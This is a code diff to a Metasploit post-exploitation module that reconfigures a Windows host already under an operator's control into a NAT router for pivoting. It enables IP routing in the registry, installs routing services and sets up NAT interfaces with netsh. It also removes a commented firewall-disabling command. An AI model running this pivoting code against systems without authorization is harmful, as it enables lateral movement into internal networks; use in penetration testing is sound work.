@@ -86,82 +86,97 @@ class MetasploitModule < Msf::Post
 
 		if is_admin? or is_system?
 		
+			rra_info = service_info("RemoteAccess")
+			rra_status = getStatus(rra_info[:status])
 			key = "HKLM\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\\"
+			iprouting_reg_status = registry_getvalinfo(key,"IPEnableRouter")["Data"]
+			win_version = session.sys.config.sysinfo['OS']
+			print_status("Operating System: #{win_version}")
 			print_status("Starting the proccess...")			
-			win_version = session.sys.config.sysinfo
-			
+						
 			# Common to all windows versions
+			print_status("Enabling IP Router...")
 			
-			print_status("	Enabling IP Router...")
-			
-			# if rra_status != 'Started'
-			if registry_setvaldata(key, "IPEnableRouter", "1", "REG_DWORD")
-				print_good("	IP Routing is Enabled.")
+			if iprouting_reg_status != 1
+				if registry_setvaldata(key, "IPEnableRouter", "1", "REG_DWORD")
+					print_good("	IP Routing is Enabled.")
+				else
+					print_bad("  	There was an error setting the IPEnableRouter value.")
+					# Exit.
+					abort("Aborting module...")
+				end
 			else
-				print_bad("  	There was an error setting the IPEnableRouter value.")
-				# Exit.
-				abort("Aborting module...")
+				print_good("	IP Routing is Enabled. It's not necessary to change the value.")
 			end
-			# else
-				# print_good("	IP Routing is Enabled.")
-			# end
 			
-			# Specific instructions for each windows version
-			print_status("Operating System: #{win_version['OS']}")
-			if win_version['OS']=~ /Windows 2008/
+			if win_version=~ /Windows 2008/
 				if have_powershell?
-					print_status("Powershell is installed in #{win_version['OS']}. Trying to install the services.")
-					# Windows 2008
-					psh_exec("Import-Module ServerManager; Add-WindowsFeature NPAS-RRAS-Services")
+					rol_status = psh_exec("Import-Module ServerManager; Get-WindowsFeature | findstr 'NPAS-RRAS-Services' | findstr '[X'")
+					if rol_status == ""
+						print_status("Powershell is installed in #{win_version['OS']}. Trying to install the services.")
+						# Windows 2008
+						psh_exec("Import-Module ServerManager; Add-WindowsFeature NPAS-RRAS-Services")
+					else
+						print_status("The services are installed. It's not necessary to install them")
+					end
 				else
 					print_status("Powershell is not installed in #{win_version['OS']}. Trying to install from command line...")
 					cmd_exec("c:\Windows\system32\ServerManagerCmd.exe -install NPAS-RRAS-Services")
 				end
-			elsif win_version['OS']=~ /Windows 2012/
+			elsif win_version=~ /Windows 2012/
 				if have_powershell?
-					print_status("Powershell is installed in #{win_version['OS']}. Trying to install the services.")
-					# Hay que deshabilitar el firewall, se propone deshabilitarlo y habilitarlo.
-					# cmd_exec("netsh advfirewall set allprofiles state off")
-					psh_exec("Import-Module ServerManager; Add-WindowsFeature Routing")
-					# cmd_exec("netsh advfirewall set allprofiles state on")
+					rol_status = psh_exec("Import-Module ServerManager; Get-WindowsFeature | findstr 'Routing' | findstr '[X'")
+					if not rol_status.include? "Installed"
+						print_status("Powershell is installed in #{win_version}. Trying to install the services.")
+						psh_exec("Import-Module ServerManager; Add-WindowsFeature Routing")
+					else
+						print_status("The services are installed. It's not necessary to install them")
+					end
 				else
-					print_bad("Powershell is not installed in #{win_version['OS']}. For this windows version (#{win_version['OS']}) we can't continue the execution.")
+					print_bad("Powershell is not installed in #{win_version}. For this windows version (#{win_version['OS']}) we can't continue the execution.")
+					abort("Aborting module...")
 				end
-			elsif win_version['OS']=~ /Windows 8/ or  win_version['OS']=~ /Windows 7/ or  win_version['OS']=~ /Windows 10/
-				print_bad("The system is not compatible with this module.")
+			elsif win_version=~ /Windows 8/ or  win_version['OS']=~ /Windows 7/ or  win_version['OS']=~ /Windows 10/
+				print_bad("The system #{win_version} is not compatible with this module. The compatible systems are: Windows XP, Windows Server 2003, Windows Server 2008, windows Server 2012 and Windows Server 2016.")
 			end
 			
 			# Common to all windows versions
 			
-			print_status(cmd_exec("netsh routing ip nat install"))
-			print_status(cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt02']}\" full"))
-			print_status(cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt01']}\" private"))
+			print_status("Configuring interfaces...")
+			cmd_exec("netsh routing ip nat install")
+			cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt02']}\" full")
+			cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt01']}\" private")
 			
 			# Specific instructions for each windows version
 			
-			print_status("	Enabling Routing and Remote Access service...")
-			if win_version['OS']=~ /Windows 2012/
-				cmd_exec ("sc config RemoteAccess start= auto")
-				print_status("	Starting Routing and Remote Access service...")
-				cmd_exec("net start RemoteAccess")
+			print_status("Enabling Routing and Remote Access service...")
+			if rra_status == 'Started'
+				print_good("The service is enabled. It's not necessary to start it.")
 			else
-				if service_change_startup("RemoteAccess",2)
-					print_good("	RemoteAccess service enabled.")
-				else
-					print_bad("  	There was an error enabling RemoteAccess service.")
-					# Exit
-					abort("Aborting module...")
-				end
-				print_status("	Starting Routing and Remote Access service...")
-				if service_start("RemoteAccess")
+				if win_version=~ /Windows 2012/
+					cmd_exec ("sc config RemoteAccess start= auto")
+					print_status("Starting Routing and Remote Access service...")
+					cmd_exec("net start RemoteAccess")
 					print_good("	RemoteAccess service started.")
 				else
-					print_bad("  	There was an error starting RemoteAccess service.")
-					# Exit
-					abort("Aborting module...")
-				end
-			end			
-			puts("")
+					if service_change_startup("RemoteAccess",2)
+						print_good("	RemoteAccess service enabled.")
+					else
+						print_bad("  	There was an error enabling RemoteAccess service.")
+						# Exit
+						abort("Aborting module...")
+					end
+					print_status("Starting Routing and Remote Access service...")
+					if service_start("RemoteAccess")
+						print_good("	RemoteAccess service started.")
+					else
+						print_bad("  	There was an error starting RemoteAccess service.")
+						# Exit
+						abort("Aborting module...")
+					end
+				end			
+				puts("")
+			end
 		else
 			print_bad("You have to be administrator in the pivot machine to execute this module.")
 			abort("Aborting module...")
@@ -185,14 +200,6 @@ class MetasploitModule < Msf::Post
 		if get_cidr(datastore['NET']) == false or not((0..33).include?(get_cidr(datastore['NET']))) or not(Rex::Socket.is_ipv4?(get_net(datastore['NET'])))
 			print_bad("You need to provide IPv4 network in NET parameter. Example: 192.168.1.0/24")
 			return false
-		# elsif not((0..33).include?(get_cidr(datastore['NET'])))
-			# print_bad("You need to provide IPv4 network in NET parameter. Example: 192.168.1.0/24")
-			# return false
-		# elsif not(Rex::Socket.is_ipv4?(get_net(datastore['NET'])))
-			# print_bad("You need to provide IPv4 network in NET parameter. Example: 192.168.1.0/24")
-			# return false
-		# else
-			# return true
 		end
 		return true
 	end
@@ -350,6 +357,7 @@ class MetasploitModule < Msf::Post
   	# MAIN PROGRAM
   	#
 	def run
+
 		if check_rnet()
 			case session.platform
 			when 'linux'
@@ -361,6 +369,5 @@ class MetasploitModule < Msf::Post
 		else
 			print_bad("Aborting Module...")
 		end
-			
   	end
 end
